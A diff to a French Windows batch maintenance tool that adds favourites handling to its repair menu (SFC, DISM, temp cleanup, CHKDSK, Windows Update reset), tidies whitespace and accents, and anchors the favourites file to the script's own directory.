+for %%O in ("Scan RAPIDE du systeme~Le classique SFC /scannow pour reparer l'OS" "Verification image base~Examine rapidement l'integration (DISM /CheckHealth)" "Reparation profonde~Telecharge les bons fichiers endommages (DISM /RestoreHealth)" "Nettoyage massif (Temp/Cache)~Detruit la totalite des fichiers inutiles cachant de l'espace" "Planifier un CHKDSK (C:)~Audite et repare les secteurs defectueux au prochain boot" "Reset Fix Windows Update~Redemarre brutalement le catalogue WU bloque ou corrompu") do (
+    set /a resi+=1
+    set "is_f=0"
+    set "curr_t=!res_t[%resi%]!"
+    for /f "usebackq tokens=*" %%F in ("favoris.txt") do (if "%%F"=="!curr_t!" set "is_f=1")
+    if "!is_f!"=="1" (set "res_opts=!res_opts!;(F) %%~O") else (set "res_opts=!res_opts!;%%~O")
+)
+set "res_opts=!res_opts:~1!"
+
+call :DynamicMenu "OUTIL DE REPARATION WINDOWS (Rescue)" "!res_opts!"
 set "reschoice=%errorlevel%"
+
+if "%reschoice%"=="0" goto system_tools
+
+if %reschoice% GEQ 200 (
+    set /a t_idx=%reschoice%-200
+    call :ToggleFav "!res_t[%t_idx%]!"
+    goto sys_rescue_menu
+)
 
 if "%reschoice%"=="1" goto res_sfc
 if "%reschoice%"=="2" goto res_dism_check
@@ -910,7 +939,6 @@ if "%reschoice%"=="3" goto res_dism_restore
 if "%reschoice%"=="4" goto res_temp_clean
 if "%reschoice%"=="5" goto res_chkdsk
 if "%reschoice%"=="6" goto res_wu_reset
-if "%reschoice%"=="0" goto system_tools
 goto sys_rescue_menu
 
 :res_sfc
@@ -1348,7 +1376,7 @@ echo Analyse du Registre Windows pour les erreurs et problemes de performance...
 for /f "tokens=*" %%A in ('reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall 2^>nul') do (
     set /a count+=1
     set entries[!count!]=%%A
-    
+
     echo %%A | findstr /I "IE40 IE4Data DirectDrawEx DXM_Runtime SchedulingAgent" >nul && (
         set /a safe_count+=1
         set safe_entries[!safe_count!]=%%A
@@ -1517,7 +1545,7 @@ goto sys_win_key
 :win_key_registry
 cls
 echo ===============================================
-echo      Cle Windows Installée (Registre)
+echo      Cle Windows Installee (Registre)
 echo ===============================================
 echo.
 echo Recherche de la cle actuellement utilisee par Windows...
@@ -1552,7 +1580,7 @@ if "!office_vbs!"=="" (
     echo [INFO] Script de statut Office non trouve ^(ospp.vbs^).
     echo Si Office est installe, sa version est peut-etre differente ^(pas 2016/2019/365^).
 ) else (
-    echo [INFO] Depuis Office 2013, Microsoft masque volontairement 
+    echo [INFO] Depuis Office 2013, Microsoft masque volontairement
     echo la cle de licence complete sur votre ordinateur par securite.
     echo Seuls les 5 derniers caracteres sont stockes sur ce PC.
     echo.
@@ -1568,7 +1596,7 @@ echo ===============================================
 echo      Creation du dossier "God Mode"
 echo ===============================================
 echo.
-echo Le "God Mode" centralise tous les parametres de Windows 
+echo Le "God Mode" centralise tous les parametres de Windows
 echo (+ de 200 options^) dans un seul et meme dossier.
 echo.
 set "GODMODE_PATH=%USERPROFILE%\Desktop\God Mode.{ED7BA470-8E54-465E-825C-99712043E01C}"
@@ -1602,8 +1630,6 @@ echo battery_report.html
 echo.
 pause
 goto system_tools
-
-
 
 :sys_bitlocker_check
 cls
@@ -2011,16 +2037,18 @@ goto system_tools
 set "tf_target=%~1"
 if not defined tf_target exit /b
 set "was_removed=0"
-if exist "favoris_tmp.txt" del "favoris_tmp.txt"
-if exist "favoris.txt" (
-    for /f "usebackq tokens=*" %%F in ("favoris.txt") do (
+set "FAV_FILE=%SCRIPT_DIR%\favoris.txt"
+set "FAV_TMP=%SCRIPT_DIR%\favoris_tmp.txt"
+if exist "%FAV_TMP%" del "%FAV_TMP%"
+if exist "%FAV_FILE%" (
+    for /f "usebackq tokens=*" %%F in ("%FAV_FILE%") do (
         if "%%F"=="!tf_target!" (
             set "was_removed=1"
         ) else (
-            echo %%F>>favoris_tmp.txt
+            echo %%F>>"%FAV_TMP%"
         )
     )
 )
-if "!was_removed!"=="0" echo !tf_target!>>favoris_tmp.txt
-if exist "favoris_tmp.txt" (move /y "favoris_tmp.txt" "favoris.txt" >nul) else (type nul > "favoris.txt")
+if "!was_removed!"=="0" echo !tf_target!>>"%FAV_TMP%"
+if exist "%FAV_TMP%" (move /y "%FAV_TMP%" "%FAV_FILE%" >nul) else (type nul > "%FAV_FILE%")
 exit /b
